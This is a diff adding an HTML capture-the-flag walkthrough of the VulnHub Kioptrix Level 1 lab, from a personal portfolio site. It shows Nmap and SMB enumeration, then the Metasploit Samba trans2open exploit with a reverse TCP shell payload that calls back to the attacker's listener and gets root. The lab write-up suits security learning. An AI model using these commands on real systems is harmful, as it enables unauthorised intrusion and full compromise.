@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kioptrix Level 1 Walkthrough — Rahul Lingampally</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 fill=%22%23090c0a%22/><text x=%2220%22 y=%2270%22 font-family=%22monospace%22 font-size=%2260%22 fill=%22%2339ff88%22>_</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<nav class="tmux-bar">
+  <div class="tmux-inner">
+    <span class="tmux-session">rahul@soc:~</span>
+    <a class="tmux-tab" href="../index.html#hero">whoami</a>
+    <a class="tmux-tab" href="../index.html#certs">certs</a>
+    <a class="tmux-tab" href="../index.html#skills">skills</a>
+    <a class="tmux-tab" href="../index.html#experience">experience</a>
+    <a class="tmux-tab" href="../index.html#projects">projects</a>
+    <a class="tmux-tab is-active" href="../blog.html">walkthroughs</a>
+    <a class="tmux-tab" href="../index.html#contact">contact</a>
+  </div>
+</nav>
+
+<section class="article-header">
+  <div class="wrap">
+    <span class="article-tag">rooted</span>
+    <h1 class="article-title">Kioptrix Level 1: SMB Enumeration to Root Shell</h1>
+    <div class="article-meta">VulnHub · Target 192.168.100.45 · Samba 2.2.1a trans2open overflow</div>
+  </div>
+</section>
+
+<section class="article-body">
+  <div class="wrap">
+    <h2>Introduction</h2>
+    <p>The Kioptrix Level 1 machine is a classic beginner-friendly VulnHub lab designed to teach fundamental enumeration and exploitation. The objective is to gain root access on a simulated misconfigured Linux system.</p>
+
+    <h2>Step 1: Reconnaissance with Nmap</h2>
+    <p>The initial Nmap scan revealed several old and vulnerable services.</p>
+    <pre><code># nmap 192.168.100.45 -T4 -sV -A
+PORT    STATE SERVICE       VERSION
+22/tcp  open  ssh           OpenSSH 2.9p2 (protocol 1.99)
+80/tcp  open  http          Apache httpd 1.3.20
+139/tcp open  netbios-ssn   Samba smbd
+445/tcp open  ssl/https     Apache/1.3.20 (Unix) (Red-Hat/Linux)</code></pre>
+    <p>The key findings are a very old OpenSSH, an ancient Apache, and Samba running on port 139. Samba is a frequent source of remote code execution.</p>
+
+    <h2>Step 2: Enumerating SMB Shares</h2>
+    <p>I used <code>smbclient</code> to list the shares on the target and found that anonymous login was enabled.</p>
+    <pre><code># smbclient -L //192.168.100.45/
+Anonymous login successful
+
+Sharename       Type      Comment
+---------       ----      -------
+IPC$            IPC       IPC Service (Samba Server)
+ADMIN$          IPC       IPC Service (Samba Server)
+...</code></pre>
+    <p>This confirmed anonymous access and suggested the Samba version was old.</p>
+
+    <h2>Step 3: Metasploit - SMB Version Detection</h2>
+    <p>To pinpoint the exact Samba version, I used a Metasploit auxiliary scanner.</p>
+    <pre><code>msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.100.45
+msf6 auxiliary(scanner/smb/smb_version) > set RPORT 139
+msf6 auxiliary(scanner/smb/smb_version) > run
+...
+[+] 192.168.100.45:139    Host could not be identified: Unix (Samba 2.2.1a)</code></pre>
+    <p>The target is running <strong>Samba 2.2.1a</strong>, which is vulnerable to a buffer overflow attack.</p>
+
+    <h2>Step 4: Exploiting Samba with Metasploit</h2>
+    <p>I searched Metasploit for an exploit and found <code>exploit/linux/samba/trans2open</code>, which targets this exact vulnerability.</p>
+    <pre><code>msf6 > use exploit/linux/samba/trans2open
+msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.100.45
+msf6 exploit(linux/samba/trans2open) > set LHOST 192.168.100.18
+msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
+msf6 exploit(linux/samba/trans2open) > run
+
+[*] Started reverse TCP handler on 192.168.100.18:4444
+...
+[*] Trying return address 0xbffffdfc...
+...
+[+] Command shell session 5 opened (192.168.100.18:4449 -> 192.168.100.45:1029)
+
+whoami
+root</code></pre>
+
+    <h2>Conclusion</h2>
+    <p>The exploit was successful and provided a reverse shell, landing as the <code>root</code> user. Kioptrix Level 1 was successfully compromised.</p>
+
+    <div class="article-back"><a class="btn" href="../blog.html">← all walkthroughs</a></div>
+  </div>
+</section>
+
+<footer>rahullingampally.online</footer>
+<script src="../assets/script.js"></script>
+</body>
+</html>
